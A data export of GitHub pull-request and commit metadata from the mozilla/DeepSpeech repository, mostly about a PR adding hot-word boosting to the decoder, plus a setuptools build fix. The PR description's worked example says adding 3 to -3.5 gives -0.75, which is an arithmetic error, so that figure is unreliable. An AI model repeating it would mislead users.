490,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3307,3307,updating docs for #3295,,DewiBrynJones,8668769,2020-09-02T14:22:25Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a8d140da81c85e68097760c3bbd68e13721f4bf,updating docs for #3295
491,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3306,3306,update after #3295,,DewiBrynJones,8668769,2020-09-02T14:21:51Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b26548437fd6dcbe4c80883daccafa36c69b115a,update after #3295
492,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3304,3304,fix for #3295 on r0.8 branch,,lissyx,1645737,2020-09-02T12:05:17Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a37c5f19a777198fd86a17a834f9bfcffa4872e9,fix for #3295 on r0.8 branch
493,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3303,3303,Pr3301,,lissyx,1645737,2020-09-02T12:04:38Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f5c57425aeaeec0569d4170fcd230a004c7af05,bump up and fix version numbers for setuptools
494,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3303,3303,Pr3301,,lissyx,1645737,2020-09-02T12:04:38Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2df95070c18eb87a3ca88bef1a41d87f51f6bf5,doh
495,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3302,3302,fix for #3295 on r0.8 branch,,lissyx,1645737,2020-09-02T12:03:21Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a37c5f19a777198fd86a17a834f9bfcffa4872e9,fix for #3295 on r0.8 branch
496,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3301,3301,Fix for setuptools._distutils issue (#3295),"This is a simple fix for being able to build once again any release DS following problems that have arisen after setuptool 50.0.0 release. 

https://github.com/mozilla/DeepSpeech/issues/3295#issuecomment-685476173

Cheers!",DewiBrynJones,8668769,2020-09-02T11:47:20Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6dff311f61001650127a38170873cb26fda638c,fix for #3295
497,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3300,3300,Fix #3292: Linux debug builds,,lissyx,1645737,2020-09-02T08:55:29Z,COLLABORATOR,False,179,39,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dad3dc1289eb14f1c4d293acea571326a989c89c,Fix #3292: Linux debug builds
498,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26155ac582f225f7a350620ed15b7e744a1e0268,enable hot-word boosting
499,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3745a5157a2afd4f3d24cd5756161dc5a4676354,more consistent ordering of CLI arguments
500,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a3be21c5985a303d7fec04076f23bb448a526eb,progress on review
501,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b44f74951135895a6fb5f9cb3278466016b4f7d,"use map instead of set for hot-words, move string logic to client.cc"
502,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42f1f3af2182667f9f2afc2cad3b683a7930f4a2,typo bug
503,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,103ee935b99283295c77db36e184070225e1dd61,pointer things?
504,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81157f5e1b887c18f8b5f54c450d21170f9771c0,"use map for hotwords, better string splitting"
505,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba809434d42289cf86045fc1019d54dec53f0ea6,"add the boost, not multiply"
506,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff74bd5b66a769ebd244bed5e7948b4a9d132174,cleaning up
507,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b997babc6df06428c1b1424491d7dee547faf2b1,cleaning whitespace
508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fbad1679690f6952b7af7c829e866b0ce421987,remove <set> inclusion
509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96cd43ddc48a55846011d125d5e15cc78ab63249,change typo set-->map
510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3a53784b672764a8c17a1103b8b297950dfe9d9,"rename boost_coefficient to boost

X-DeepSpeech: NOBUILD"
511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdf44aab765e973160ffdea4787960bb498f7074,add hot_words to python bindings
512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8a779d4d8a894cdbed154f42abfc7f936c3c727,missing hot_words
513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b047db2ea27ed891b0849867d70b07e193e21bb0,include map in swigwrapper.i
514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e8ff99ab70e68a4a2b702b1e779ca1ac492f714,add Map template to swigwrapper.i
515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fc3521a47086f05af1b09bbddae3200cf409d52,emacs intermediate file
516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c64c68b33f97434784ba01d30b9f336b91fb9d63,map things
517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c805ab7dafb0477330c2e943ddc8d30b5cc6b678,map-->unordered_map
518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c611bc2e040d6772754ae61650af83fa7937b6e,typu
519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97b0416d5887ea13b0627091a3be2edade6f393f,typu
520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82a582d0b40182436a6ae4b91929463f151ab5e6,use dict() not None
521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

